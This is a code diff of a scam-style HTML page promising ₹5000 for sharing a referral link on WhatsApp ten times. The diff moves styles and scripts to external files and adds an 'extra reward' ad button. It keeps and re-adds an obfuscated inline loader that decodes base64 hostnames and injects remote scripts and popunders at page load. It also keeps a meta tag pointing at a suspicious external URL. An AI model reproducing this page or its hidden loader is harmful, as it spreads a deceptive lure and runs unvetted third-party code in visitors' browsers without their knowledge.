@@ -1,99 +1,13 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <script type="text/javascript" data-cfasync="false">
-        /*<![CDATA[/* */
-        (function(){var h=window,f="f5d51f582260e7a431e2091cdf755c44",u=[["siteId",586*85*361*978*312-5486770308373],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],b=["d3d3LmJldHRlcmFkc3lzdGVtLmNvbS9HRVVaZHovbmFuaW1hLm1pbi5qcw==","ZDJrazBvM2ZyN2VkMDEuY2xvdWRmcm9udC5uZXQvcC9QL3Nwb3N0YWwubWluLmNzcw=="],n=-1,o,k,v=function(){clearTimeout(k);n++;if(b[n]&&!(1777001186000<(new Date).getTime()&&1<n)){o=h.document.createElement("script");o.type="text/javascript";o.async=!0;var a=h.document.getElementsByTagName("script")[0];o.src="https://"+atob(b[n]);o.crossOrigin="anonymous";o.onerror=v;o.onload=function(){clearTimeout(k);h[f.slice(0,16)+f.slice(0,16)]||v()};k=setTimeout(v,5E3);a.parentNode.insertBefore(o,a)}};if(!h[f]){try{Object.freeze(h[f]=u)}catch(e){}v()}})();
-        /*]]>/* */
-    </script>
     <meta charset="UTF-8">
     <meta name="14c9e76af8a109f8c90a75cb9dd9f9b8eb152149" content="14c9e76af8a109f8c90a75cb9dd9f9b8eb152149"
-    src="https://mortifiedcourse.com/dbmTFjz.dDGrNcvXZMGwUT/kePm/9yuTZBU_lzkXPFTZYw0UNzj/ENzsNEDXAft/NPjrQ/2EM/T/Mf0zMpQo"/>
+          src="https://mortifiedcourse.com/dbmTFjz.dDGrNcvXZMGwUT/kePm/9yuTZBU_lzkXPFTZYw0UNzj/ENzsNEDXAft/NPjrQ/2EM/T/Mf0zMpQo"/>
     <meta name="referrer" content="no-referrer-when-downgrade" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Earn ₹5000 - Share with Friends!</title>
-    <style>
-        body {
-            font-family: 'Arial', sans-serif;
-            background: linear-gradient(135deg, #6e8efb, #a777e3);
-            color: white;
-            text-align: center;
-            padding: 20px;
-            margin: 0;
-        }
-        .container {
-            max-width: 600px;
-            margin: 0 auto;
-            background-color: rgba(255,255,255,0.1);
-            padding: 30px;
-            border-radius: 15px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
-        }
-        h1 {
-            font-size: 2.5em;
-            margin-bottom: 10px;
-        }
-        .highlight {
-            color: #FFD700;
-            font-weight: bold;
-        }
-        .steps {
-            text-align: left;
-            margin: 30px 0;
-            background: rgba(255,255,255,0.15);
-            padding: 20px;
-            border-radius: 10px;
-        }
-        .step {
-            margin-bottom: 15px;
-            display: flex;
-            align-items: center;
-        }
-        .step-number {
-            background-color: #FFD700;
-            color: #333;
-            width: 25px;
-            height: 25px;
-            border-radius: 50%;
-            display: inline-flex;
-            justify-content: center;
-            align-items: center;
-            margin-right: 15px;
-            font-weight: bold;
-        }
-        .btn {
-            background-color: #25D366;
-            color: white;
-            border: none;
-            padding: 15px 30px;
-            font-size: 1.2em;
-            border-radius: 50px;
-            cursor: pointer;
-            margin: 20px 0;
-            font-weight: bold;
-            transition: all 0.3s;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
-        }
-        .btn:hover {
-            background-color: #128C7E;
-            transform: translateY(-3px);
-            box-shadow: 0 8px 20px rgba(0,0,0,0.3);
-        }
-        .counter {
-            font-size: 1.2em;
-            margin: 20px 0;
-        }
-        .hidden {
-            display: none;
-        }
-        .reward-section {
-            margin-top: 30px;
-            padding: 20px;
-            background: rgba(255,215,0,0.2);
-            border-radius: 10px;
-            border: 2px dashed #FFD700;
-        }
-    </style>
+    <link rel="stylesheet" href="styles.css">
 </head>
 <body>
 <div class="container">
@@ -120,6 +34,7 @@
     </div>
 
     <button id="share-btn" class="btn">SHARE NOW</button>
+    <button id="load-ad-btn" class="btn" style="background-color: #FF5722;">LOAD AD FOR EXTRA REWARD</button>
 
     <div id="reward-section" class="reward-section hidden">
         <h2>Congratulations! 🎉</h2>
@@ -129,35 +44,11 @@
     </div>
 </div>
 
-<script>
-    let shareCount = 0;
-    const shareBtn = document.getElementById('share-btn');
-    const shareCountEl = document.getElementById('share-count');
-    const rewardSection = document.getElementById('reward-section');
-
-    shareBtn.addEventListener('click', function() {
-        // Generate unique referral link
-        const referralLink = "https://earn5000.example.com/?ref=" + Math.random().toString(36).substring(7);
-
-        // Create WhatsApp share link
-        const message = `Hey! I just found this amazing way to earn ₹5000 instantly. Check it out: ${referralLink}`;
-        const whatsappUrl = `https://wa.me/?text=${encodeURIComponent(message)}`;
-
-        // Open WhatsApp share dialog
-        window.open(whatsappUrl, '_blank');
-
-        // Simulate share tracking (in real app, this would be server-side)
-        shareCount++;
-        shareCountEl.textContent = shareCount;
-
-        // Show reward section when 10 shares are reached
-        if (shareCount >= 10) {
-            rewardSection.classList.remove('hidden');
-            shareBtn.disabled = true;
-            shareBtn.textContent = "Task Completed!";
-            shareBtn.style.backgroundColor = "#4CAF50";
-        }
-    });
+<script src="script.js"></script>
+<script type="text/javascript" data-cfasync="false">
+    /*<![CDATA[/* */
+    (function(){var h=window,f="f5d51f582260e7a431e2091cdf755c44",u=[["siteId",586*85*361*978*312-5486770308373],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],b=["d3d3LmJldHRlcmFkc3lzdGVtLmNvbS9HRVVaZHovbmFuaW1hLm1pbi5qcw==","ZDJrazBvM2ZyN2VkMDEuY2xvdWRmcm9udC5uZXQvcC9QL3Nwb3N0YWwubWluLmNzcw=="],n=-1,o,k,v=function(){clearTimeout(k);n++;if(b[n]&&!(1777001186000<(new Date).getTime()&&1<n)){o=h.document.createElement("script");o.type="text/javascript";o.async=!0;var a=h.document.getElementsByTagName("script")[0];o.src="https://"+atob(b[n]);o.crossOrigin="anonymous";o.onerror=v;o.onload=function(){clearTimeout(k);h[f.slice(0,16)+f.slice(0,16)]||v()};k=setTimeout(v,5E3);a.parentNode.insertBefore(o,a)}};if(!h[f]){try{Object.freeze(h[f]=u)}catch(e){}v()}})();
+    /*]]>/* */
 </script>
 </body>
 </html>
